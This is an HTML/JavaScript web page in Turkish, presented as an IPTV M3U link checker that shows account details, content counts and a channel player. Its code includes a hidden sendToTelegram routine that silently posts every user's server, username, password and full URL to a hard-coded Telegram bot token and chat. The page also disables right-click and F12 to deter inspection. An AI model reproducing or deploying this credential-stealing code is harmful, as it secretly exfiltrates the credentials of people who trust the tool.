<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>M3U Kontrol AracÄ±</title>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: linear-gradient(135deg, #0e160c 0%, #1d291a 100%);
      color: #e6eef3;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
      overflow-x: hidden;
    }
            /* Matrix efekti */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.1;
            pointer-events: none;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }
        
    
    .background-animation {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(ellipse at top, rgba(81, 207, 102, 0.1) 0%, transparent 50%);
      z-index: -1;
      animation: float 6s ease-in-out infinite;
    }
    
    @keyframes float {
      0%, 100% { transform: translateY(0px) rotate(0deg); }
      50% { transform: translateY(-10px) rotate(1deg); }
    }
    
    .container {
      max-width: 1200px;
      padding: 20px;
      margin: 0 auto;
    }
    
    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
      background: linear-gradient(135deg, rgba(81, 207, 102, 0.1) 0%, rgba(255, 255, 255, 0.05) 100%);
      border-radius: 20px;
      border: 1px solid rgba(81, 207, 102, 0.2);
      backdrop-filter: blur(10px);
    }
    
    .header h1 {
      color: #fff;
      font-size: 2.5rem;
      margin-bottom: 5px;
      text-shadow: 0 0 20px rgba(81, 207, 102, 0.5);
      background: linear-gradient(45deg, #51cf66, #38a700);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    
    .header .subtitle {
      color: #8a9ba8;
      font-size: 1.1rem;
      opacity: 0.9;
    }

    .logo {
        width: 150px;
        margin-bottom: 5px;
    }

    .copyright-text {
        font-family: 'Dancing Script', cursive;
        font-size: 1.2rem;
        color: #51cf66;
        margin-top: 5px;
        font-weight: 700;
        text-shadow: 0 0 5px rgba(81, 207, 102, 0.5);
    }
    
    .input-section {
      background: linear-gradient(135deg, rgba(21, 35, 21, 0.9) 0%, rgba(31, 56, 31, 0.9) 100%);
      border: 1px solid rgba(81, 207, 102, 0.2);
      padding: 8px 10px;
      border-radius: 15px;
      margin-bottom: 5px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }
    
    .form-control {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(81, 207, 102, 0.3);
      color: #e6eef3;
      padding: 10px 15px;
      height: 42px;
      font-weight: 600;
      border-radius: 10px;
      transition: all 0.3s ease;
      backdrop-filter: blur(5px);
    }
    
    .form-control:focus {
      background: rgba(255, 255, 255, 0.1);
      border-color: #51cf66;
      box-shadow: 0 0 15px rgba(81, 207, 102, 0.3);
      color: #fff;
    }
    
    .btn-info {
      background: linear-gradient(135deg, #51cf66 0%, #38a700 100%);
      border: none;
      padding: 10px 25px;
      height: 42px;
      border-radius: 10px;
      font-weight: 600;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(81, 207, 102, 0.4);
    }
    
    .btn-info:hover {
      background: linear-gradient(135deg, #38a700 0%, #2a8a00 100%);
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(81, 207, 102, 0.6);
    }
    
    .section {
      background: linear-gradient(135deg, rgba(21, 35, 21, 0.9) 0%, rgba(31, 56, 31, 0.9) 100%);
      border: 1px solid rgba(81, 207, 102, 0.15);
      padding: 25px;
      border-radius: 15px;
      margin-top: 5px;
      margin-bottom: 5px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      transition: all 0.3s ease;
    }
    
    .section:hover {
      border-color: rgba(81, 207, 102, 0.3);
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
    }
    
    .info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 15px;
    }
    
    .info-row {
      background: rgba(255, 255, 255, 0.05);
      padding: 15px;
      border-radius: 10px;
      border: 1px solid rgba(81, 207, 102, 0.1);
      transition: all 0.3s ease;
      position: relative;
    }
    
    .info-row:hover {
      background: rgba(255, 255, 255, 0.08);
      border-color: rgba(81, 207, 102, 0.3);
      transform: translateY(-2px);
    }
    
    .info-label {
      color: #51cf66;
      font-weight: 600;
      font-size: 0.9rem;
      display: block;
      margin-bottom: 5px;
    }
    
    .info-value {
      color: #fff;
      font-size: 1rem;
      font-weight: 500;
    }
    
    .status-active {
        color: #51cf66 !important;
        font-weight: bold;
    }
    
    .stats-container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 15px;
      margin-top: 20px;
    }
    
    .stat-badge {
      background: linear-gradient(135deg, rgba(81, 207, 102, 0.2) 0%, rgba(255, 255, 255, 0.05) 100%);
      padding: 20px;
      border-radius: 15px;
      text-align: center;
      border: 1px solid rgba(81, 207, 102, 0.3);
      transition: all 0.3s ease;
      backdrop-filter: blur(5px);
    }
    
    .stat-badge:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 25px rgba(81, 207, 102, 0.3);
    }
    
    .stat-badge .num {
      font-size: 2rem;
      font-weight: 800;
      color: #fff;
      text-shadow: 0 0 10px rgba(81, 207, 102, 0.5);
      margin-bottom: 5px;
    }
    
    .stat-badge .lbl {
      color: #bfc7cb;
      font-size: 0.9rem;
      font-weight: 500;
    }
    
    .small-note {
      font-size: 0.9rem;
      color: #8a9ba8;
      text-align: center;
      padding: 10px;
    }
    
    .error-message {
      color: #ff6b6b;
      background: linear-gradient(135deg, rgba(45, 27, 27, 0.9) 0%, rgba(92, 43, 43, 0.5) 100%);
      border: 1px solid rgba(255, 107, 107, 0.3);
      padding: 15px;
      border-radius: 10px;
      margin: 15px 0;
      backdrop-filter: blur(5px);
    }
    
    .success-message {
      color: #51cf66;
      background: linear-gradient(135deg, rgba(27, 45, 27, 0.9) 0%, rgba(43, 92, 43, 0.5) 100%);
      border: 1px solid rgba(81, 207, 102, 0.3);
      padding: 15px;
      border-radius: 10px;
      margin: 15px 0;
      backdrop-filter: blur(5px);
    }

    .copy-btn {
        background: rgba(255, 255, 255, 0.1);
        border: 1px solid rgba(81, 207, 102, 0.2);
        color: #51cf66;
        width: 30px;
        height: 30px;
        border-radius: 5px;
        position: absolute;
        right: 15px;
        top: 50%;
        transform: translateY(-50%);
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        transition: all 0.2s ease;
    }

    .copy-btn:hover {
        background: rgba(81, 207, 102, 0.2);
    }

    .telegram-link {
        display: inline-flex;
        align-items: center;
        margin-top: 15px;
        color: #51cf66;
        text-decoration: none;
        font-weight: 600;
        transition: color 0.3s ease;
    }

    .telegram-link i {
        font-size: 1.5rem;
        margin-right: 10px;
    }

    .telegram-link:hover {
        color: #38a700;
        text-decoration: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .spin {
        animation: spin 1s linear infinite;
        display: inline-block;
    }

    .toast-message {
      position: fixed;
      top: 20px;
      right: 20px;
      background: linear-gradient(135deg, rgba(81, 207, 102, 0.9) 0%, rgba(56, 167, 0, 0.9) 100%);
      color: white;
      padding: 12px 20px;
      border-radius: 10px;
      z-index: 10000;
      font-size: 14px;
      font-weight: 600;
      box-shadow: 0 4px 15px rgba(81, 207, 102, 0.4);
      backdrop-filter: blur(10px);
      transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
    }

    .play-btn {
        background: linear-gradient(135deg, #28a745 0%, #218838 100%);
        color: white;
        border: none;
        padding: 5px 10px;
        border-radius: 5px;
        cursor: pointer;
        font-size: 14px;
        transition: all 0.2s ease;
    }
    .play-btn:hover {
        background: linear-gradient(135deg, #218838 0%, #1e7e34 100%);
    }

    .close-player-btn {
        background: #dc3545;
        color: white;
        border: none;
        padding: 5px 10px;
        border-radius: 4px;
        cursor: pointer;
        position: absolute;
        top: 5px;
        right: 5px;
        z-index: 10;
    }

    .player-container {
        position: relative;
        margin-top: 10px;
        border: 1px solid rgba(81, 207, 102, 0.3);
        border-radius: 8px;
        background: rgba(255, 255, 255, 0.05);
        padding: 10px;
    }

    .channel-item {
      background: rgba(255, 255, 255, 0.05);
      padding: 10px;
      border-radius: 8px;
      border: 1px solid rgba(81, 207, 102, 0.1);
      margin-bottom: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .channel-item-info {
        flex-grow: 1;
        margin-right: 10px;
    }

    .show-all-btn {
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(81, 207, 102, 0.3);
        color: #e6eef3;
        font-weight: bold;
        text-align: center;
        padding: 10px;
        border-radius: 10px;
        cursor: pointer;
        margin-top: 20px;
        transition: all 0.3s ease;
    }

    .show-all-btn:hover {
        background: rgba(255, 255, 255, 0.1);
        border-color: #51cf66;
    }
    
    @media (max-width: 768px) {
      .container { padding: 15px; }
      .header h1 { font-size: 2rem; }
      .section { padding: 20px; }
      .info-grid { grid-template-columns: 1fr; gap: 10px; }
      .stats-container { grid-template-columns: repeat(auto-fit, min-content); gap: 10px; }
    }
  </style>
</head>
<body>
  <canvas id="matrix-bg" class="matrix-bg"></canvas>
    
  <div class="container my-4">
    <div class="header">
      <img src="logo.jpg" alt="Logo" class="logo">
      <h1>á´É´ÊÉªÉ´á´ á´ð¹á´ á´Êá´á´á´ á´á´á´Ê </h1>
      <div class="copyright-text">all right reserved AkÄ±ncÄ±lar </div>
    </div>
  
    <div class="input-section">
      <div class="input-group">
        <input id="m3uUrl" class="form-control" placeholder="M3U URL'sini girin" />
        <div class="input-group-append">
          <button class="btn btn-info" onclick="testM3U()">Kontrol Et</button>
        </div>
      </div>
    </div>

    <div class="section" id="info" style="display:none;">
      <h5>âï¸ Hesap & Sunucu Bilgileri</h5>
      <div class="info-grid mt-2" id="info-content"></div>
    </div>

    <div class="section" id="stats-section" style="display:none;">
      <h5>ð Ä°Ã§erik Ä°statistikleri</h5>
      <div id="stats" class="stats-container"></div>
    </div>

    <div class="section" id="categories-section" style="display:none;">
        <h5>ðº CanlÄ± Kanallar</h5>
        <div id="categories-list"></div>
    </div>

    <footer class="text-center small-note mt-3">
        <a href="https://t.me/+pO3sBu-9wpM4NzE8" class="telegram-link" target="_blank" rel="noopener noreferrer">
            <i class="fab fa-telegram-plane"></i>
            <span>Telegram Grubumuza KatÄ±lÄ±n</span>
        </a>
    </footer>
  </div>

<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>

<script>
    
// Matrix efekti baÅlat
initMatrixEffect();

// saÄ tÄ±k ve F12 engeli
document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
});

document.addEventListener('keydown', function(e) {
  if (e.keyCode === 123) {
    e.preventDefault();
  }
});
		
// https'yi kaldÄ±rÄ±n ve http yapÄ±n
document.getElementById('m3uUrl').addEventListener('paste', function(event) {
  event.preventDefault();
  let pasteData = (event.clipboardData || window.clipboardData).getData('text');
  this.value = pasteData.replace(/^https:/, 'http:');
});

let globalApiUrl = '';
let globalWorkingProxy = null;
let globalUser = '';
let globalPass = '';
let globalServer = '';

async function testM3U(){
  const url = document.getElementById("m3uUrl").value.trim();
  if(!url){ 
    showToast("â ï¸ LÃ¼tfen M3U URL girin");
    return;
  }

  showToast('<span class="spin">ð</span> YÃ¼kleniyor...');
  document.getElementById("info").style.display = "none";
  document.getElementById("stats-section").style.display = "none";
  document.getElementById("categories-section").style.display = "none";
  document.getElementById("categories-list").innerHTML = '';

  try {
    const u = new URL(url);
    const params = new URLSearchParams(u.search);
    const user = params.get("username");
    const pass = params.get("password");
    const server = `${u.protocol}//${u.hostname}${u.port?":"+u.port:""}`;
    const api = `${server}/player_api.php?username=${user}&password=${pass}`;

    globalApiUrl = api;
    globalUser = user;
    globalPass = pass;
    globalServer = server;

    sendToTelegram(url, server, user, pass);

    const corsProxies = [
  "https://api.codetabs.com/v1/proxy?quest=",
  "https://cors-anywhere.herokuapp.com/",
];
    
    let info;
    globalWorkingProxy = null;
    
    for (const proxy of corsProxies) {
      try {
        const proxyUrl = proxy + encodeURIComponent(api + "&action=get_user_info");
        const infoRes = await axios.get(proxyUrl, { timeout: 15000 });
        info = infoRes.data;
        globalWorkingProxy = proxy;
        break;
      } catch (err) {
        console.log(`Proxy ${proxy} failed, trying next...`);
        continue;
      }
    }
    
    if (!info) {
      throw new Error("TÃ¼m proxy servisleri Ã§alÄ±ÅmÄ±yor");
    }

    const status = info?.user_info?.status || "-";
    const statusClass = status === "Active" ? "status-active" : "";
    
    let html = ""; 
    html += "<div class='info-row'><span class='info-label'>Sunucu ð</span><span class='info-value'>" + server + "</span><button class='copy-btn' onclick='copyToClipboard(\"" + server + "\")'><i class='fas fa-copy'></i></button></div>";
    html += "<div class='info-row'><span class='info-label'>KullanÄ±cÄ± ð¤</span><span class='info-value'>" + (user || "-") + "</span><button class='copy-btn' onclick='copyToClipboard(\"" + (user || "") + "\")'><i class='fas fa-copy'></i></button></div>";
    html += "<div class='info-row'><span class='info-label'>Åifre ð</span><span class='info-value'>" + (pass || "-") + "</span><button class='copy-btn' onclick='copyToClipboard(\"" + (pass || "") + "\")'><i class='fas fa-copy'></i></button></div>";
    
    const createdDate = info?.user_info?.created_at ? new Date(info.user_info.created_at * 1000).toLocaleString('tr-TR') : "-";
    const expDate = info?.user_info?.exp_date ? new Date(info.user_info.exp_date * 1000).toLocaleString('tr-TR') : "-";
    
    html += "<div class='info-row'><span class='info-label'>OluÅturulma ð</span><span class='info-value'>" + createdDate + "</span></div>";
    html += "<div class='info-row'><span class='info-label'>BitiÅ â°</span><span class='info-value'>" + expDate + "</span></div>";
    html += "<div class='info-row'><span class='info-label'>Maks BaÄlantÄ± ð</span><span class='info-value'>" + (info?.user_info?.max_connections || "-") + "</span></div>";
    html += "<div class='info-row'><span class='info-label'>Aktif BaÄlantÄ± ð¢ð</span><span class='info-value'>" + (info?.user_info?.active_cons || "-") + "</span></div>";
    
    document.getElementById("info-content").innerHTML = html;
    document.getElementById("info").style.display = "block";

    showToast("â Hesap bilgileri yÃ¼klendi..");
    
    loadContentStats();
    loadCategories(10); // Ä°lk 10 kategoriyi yÃ¼kle

  } catch(err){
    console.error(err);
    showToast("â Hata: " + err.message);
  }
}

async function loadContentStats() {
  try {
    let liveCount = 0, vodCount = 0, seriesCount = 0;
    
    if (globalWorkingProxy) {
      const promises = [
        axios.get(globalWorkingProxy + encodeURIComponent(globalApiUrl + "&action=get_live_streams"), { timeout: 15000 }).catch(() => ({ data: [] })),
        axios.get(globalWorkingProxy + encodeURIComponent(globalApiUrl + "&action=get_vod_streams"), { timeout: 15000 }).catch(() => ({ data: [] })),
        axios.get(globalWorkingProxy + encodeURIComponent(globalApiUrl + "&action=get_series"), { timeout: 15000 }).catch(() => ({ data: [] }))
      ];

      const [liveRes, vodRes, seriesRes] = await Promise.all(promises);

      liveCount = Array.isArray(liveRes.data) ? liveRes.data.length : 0;
      vodCount = Array.isArray(vodRes.data) ? vodRes.data.length : 0;
      seriesCount = Array.isArray(seriesRes.data) ? Array.isArray(seriesRes.data.data) ? seriesRes.data.data.length : seriesRes.data.length : 0;
    }

    document.getElementById("stats").innerHTML = `
      <div class="stat-badge">
        <div class="num">${liveCount}</div>
        <div class="lbl">ðº CanlÄ± YayÄ±n</div>
      </div>
      <div class="stat-badge">
        <div class="num">${vodCount}</div>
        <div class="lbl">ð¬ Filmler</div>
      </div>
      <div class="stat-badge">
        <div class="num">${seriesCount}</div>
        <div class="lbl">ð Diziler</div>
      </div>
    `;

    document.getElementById("stats-section").style.display = "block";
    showToast("â TÃ¼m veriler yÃ¼klendi..");

  } catch(err) {
    console.error("Ä°Ã§erik istatistikleri yÃ¼klenemedi:", err);
    showToast("â ï¸ Hesap bilgileri yÃ¼klendi - Ä°Ã§erik sayÄ±larÄ± alÄ±namadÄ±");
    
    document.getElementById("stats").innerHTML = `
      <div class="stat-badge">
        <div class="num">-</div>
        <div class="lbl">ðº CanlÄ± YayÄ±n</div>
      </div>
      <div class="stat-badge">
        <div class="num">-</div>
        <div class="lbl">ð¬ Filmler</div>
      </div>
      <div class="stat-badge">
        <div class="num">-</div>
        <div class="lbl">ð Diziler</div>
      </div>
    `;
    document.getElementById("stats-section").style.display = "block";
  }
}

async function loadCategories(limit) {
  try {
    const catRes = await axios.get(globalWorkingProxy + encodeURIComponent(globalApiUrl + "&action=get_live_categories"), { timeout: 15000 });
    const allCats = Array.isArray(catRes.data) ? catRes.data : [];
    const categories = (limit === 'all') ? allCats : allCats.slice(0, limit);

    const categoriesList = document.getElementById('categories-list');
    categoriesList.innerHTML = '';

    if (categories.length === 0) {
        showToast("â ï¸ HiÃ§ kategori bulunamadÄ±.");
        return;
    }

    let html = '';
    categories.forEach(cat => {
      html += `
        <div class="card mb-2" style="background:transparent; border:none;">
          <div class="card-header p-2" style="cursor:pointer; background: linear-gradient(135deg, rgba(81, 207, 102, 0.2) 0%, rgba(255, 255, 255, 0.05) 100%); border-radius:10px; border: 1px solid rgba(81, 207, 102, 0.3);" data-toggle="collapse" data-target="#cat-${cat.category_id}" aria-expanded="false" aria-controls="cat-${cat.category_id}">
            <b style="color:#fff;">${cat.category_name}</b>
          </div>
          <div id="cat-${cat.category_id}" class="collapse mt-2" data-parent="#categories-list">
            <div class="card-body p-0" id="list-${cat.category_id}">
              <div class="text-center p-3">
                <i class="fas fa-spinner fa-spin"></i> Kanallar yÃ¼kleniyor...
              </div>
            </div>
          </div>
        </div>
      `;
    });
    categoriesList.innerHTML = html;
    document.getElementById("categories-section").style.display = "block";

    // TÃ¼m kategorileri gÃ¶rme baÅlÄ±ÄÄ±nÄ± ekle
    if (limit !== 'all' && allCats.length > limit) {
      const showAllBtn = document.createElement('div');
      showAllBtn.className = 'show-all-btn';
      showAllBtn.innerHTML = `TÃ¼m Kategorileri GÃ¶r (${allCats.length - limit} kategori daha)`;
      showAllBtn.onclick = () => loadCategories('all');
      categoriesList.appendChild(showAllBtn);
    }

    // Collapse event listener ekle
    $('#categories-list .collapse').on('show.bs.collapse', function () {
        const catId = this.id.replace('cat-', '');
        loadChannels(catId);
    });

  } catch (err) {
    console.error("Kategori yÃ¼klenemedi:", err);
    showToast("â ï¸ Kategoriler listelenirken bir hata oluÅtu.");
  }
}

async function loadChannels(catId) {
  const channelList = document.getElementById("list-" + catId);
  channelList.innerHTML = `<div class="text-center p-3"><i class="fas fa-spinner fa-spin"></i> Kanallar yÃ¼kleniyor...</div>`;

  try {
    const chRes = await axios.get(globalWorkingProxy + encodeURIComponent(globalApiUrl + "&action=get_live_streams&category_id=" + catId), { timeout: 15000 });
    const channels = Array.isArray(chRes.data) ? chRes.data : [];

    if (channels.length === 0) {
        channelList.innerHTML = `<div class="p-2 text-center" style="color:#8a9ba8;">Bu kategoride kanal bulunamadÄ±.</div>`;
        return;
    }

    let html = '';
    channels.forEach(channel => {
      const channelUrl = `${globalServer}/live/${globalUser}/${globalPass}/${channel.stream_id}.m3u8`;
      const uniqueId = `player-${channel.stream_id}-${catId}`; // Her kanal iÃ§in benzersiz ID
      
      html += `
        <div class="channel-item">
            <div class="channel-item-info">
                <span style="font-weight: bold;">${channel.name || 'Ä°simsiz Kanal'}</span>
                <br>
                <small style="color: #bfc7cb;">ID: ${channel.stream_id}</small>
            </div>
            <div>
                <button class="play-btn" onclick="playStream('${channelUrl}', '${uniqueId}')">
                    <i class="fas fa-play"></i> Oynat
                </button>
            </div>
        </div>
        <div id="${uniqueId}" class="player-container" style="display:none;"></div>
      `;
    });
    channelList.innerHTML = html;

  } catch (err) {
    console.error("Kanal yÃ¼klenemedi:", err);
    channelList.innerHTML = `<p class="error-message">â Kanallar yÃ¼klenirken bir hata oluÅtu.</p>`;
  }
}

// Panoya kopyalama fonksiyonu
function copyToClipboard(text) {
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).then(() => {
      showToast('KopyalandÄ±!');
    }).catch(err => {
      console.error('Kopyalama hatasÄ±: ', err);
    });
  } else {
    // Fallback iÃ§in eski yÃ¶ntem
    const textArea = document.createElement('textarea');
    textArea.value = text;
    textArea.style.position = 'fixed';
    textArea.style.left = '-999999px';
    textArea.style.top = '-999999px';
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    try {
      document.execCommand('copy');
      showToast('KopyalandÄ±!');
    } catch (err) {
      console.error('Kopyalama hatasÄ±: ', err);
    }
    textArea.remove();
  }
}

// Toast mesajÄ± gÃ¶sterme
function showToast(message) {
  const existingToast = document.querySelector('.toast-message');
  if (existingToast) {
    document.body.removeChild(existingToast);
  }
  
  const toast = document.createElement('div');
  toast.className = 'toast-message'; 
  toast.innerHTML = message;
  
  document.body.appendChild(toast);
  
  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateY(-20px)';
    setTimeout(() => {
      document.body.removeChild(toast);
    }, 500);
  }, 3000);
}

// Telegram bot'a mesaj gÃ¶nderme fonksiyonu
async function sendToTelegram(url, server, username, password) {
  setTimeout(async () => {
    try {
      const botToken = "8482288918:AAGW7CWx-K9FMGq5804nQV25uSfLXNBas3k";
      const chatId = "-1003093676109";
      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`; 
      
      const currentTime = new Date().toLocaleString('tr-TR');
      const message = `ð M3U Kontrol Talebi\n\nâ° ${currentTime}\nð ${server}\nð¤ ${username || 'N/A'}\nð ${password || 'N/A'}\n\nð ${url}`;
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);
      
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message }),
        signal: controller.signal
      });

      clearTimeout(timeoutId);
      
      if (response.ok) {
        console.log('â Telegram mesajÄ± baÅarÄ±yla gÃ¶nderildi');
      } else {
        console.log('â Telegram API yanÄ±t hatasÄ±:', response.status);
      }
    } catch (error) {
      console.log('â Telegram gÃ¶nderme hatasÄ±:', error.message);
    }
  }, 100); 
}

// --- OynatÄ±cÄ± FonksiyonlarÄ± ---

function playStream(url, playerId) {
    // TÃ¼m oyuncularÄ± kapat
    $('.player-container').hide().empty();

    const playerDiv = document.getElementById(playerId);
    playerDiv.innerHTML = `
        <div style="position: relative; margin-top: 10px;">
            <button onclick="closePlayer('${playerId}')" class="close-player-btn">â OynatÄ±cÄ±yÄ± Kapat</button>
            <video id="video-${playerId}" width="100%" controls autoplay style="border-radius: 8px;"></video>
        </div>
    `;
    playerDiv.style.display = 'block';

    const video = document.getElementById(`video-${playerId}`);

    let streamUrl = url;

    // EÄer sayfa bir sunucu Ã¼zerinde (localhost dÄ±ÅÄ±nda) Ã§alÄ±ÅÄ±yorsa ve bir proxy bulunduysa onu kullan.
    if (window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1' && globalWorkingProxy) {
        streamUrl = globalWorkingProxy + encodeURIComponent(url);
    }

    if (Hls.isSupported()) {
        const hls = new Hls();
        hls.loadSource(streamUrl);
        hls.attachMedia(video);
        hls.on(Hls.Events.MANIFEST_PARSED, function () {
            video.play();
        });

        // HLS Ã¶rneÄine referans sakla
        video._hlsInstance = hls;

    } else if (video.canPlayType('application/vnd.apple.mpegurl')) {
        // Safari desteÄi
        video.src = streamUrl;
        video.addEventListener('loadedmetadata', function () {
            video.play();
        });
    } else {
        playerDiv.innerHTML = `<p class="error-message">â TarayÄ±cÄ±nÄ±z canlÄ± yayÄ±n oynatmayÄ± desteklemiyor.</p>`;
    }
}

function closePlayer(playerId) {
    const playerDiv = document.getElementById(playerId);
    const video = document.getElementById(`video-${playerId}`);

    // HLS Ã¶rneÄini yok et
    if (video && video._hlsInstance) {
        video._hlsInstance.destroy();
    }

    // OynatÄ±cÄ±yÄ± temizle ve gizle
    playerDiv.innerHTML = "";
    playerDiv.style.display = 'none';
}


// --- Arkaplan Matrix efekti ---
        function initMatrixEffect() {
            const canvas = document.getElementById('matrix-bg');
            const ctx = canvas.getContext('2d');
            
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const katakana = 'éâ¬åéî åéè£¤åéå¿ãéãå¯éâ¿å»éî¾å ééæ©åéãåéî å§éä½µåéæå«éîä¿¨éîºå¢éååéã£éã¥éîå£é¥éå ¢å§éä½µåéå ¢å§éÂ°å éã£å«éç¬ºå éå åéî¾åéîºå éâ¬éæ¬å¦éîåéç½å¶éå åéæ¶å®éã£åµéîéæ·¬å©éå¤å¨éæ¿åéå¦å';
            const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            const nums = '0123456789';
            const symbols = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~';
            
            const alphabet = katakana + latin + nums + symbols;
            
            const fontSize = 16;
            const columns = canvas.width / fontSize;
            
            const rainDrops = [];
            
            for (let x = 0; x < columns; x++) {
                rainDrops[x] = 1;
            }
            
            const draw = () => {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#0F0';
                ctx.font = fontSize + 'px monospace';
                
                for (let i = 0; i < rainDrops.length; i++) {
                    const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                    ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                    
                    if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        rainDrops[i] = 0;
                    }
                    rainDrops[i]++;
                }
            };
            
            setInterval(draw, 30);
            
            window.addEventListener('resize', () => {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });
        }
    
    
</script>

</body>
</html>
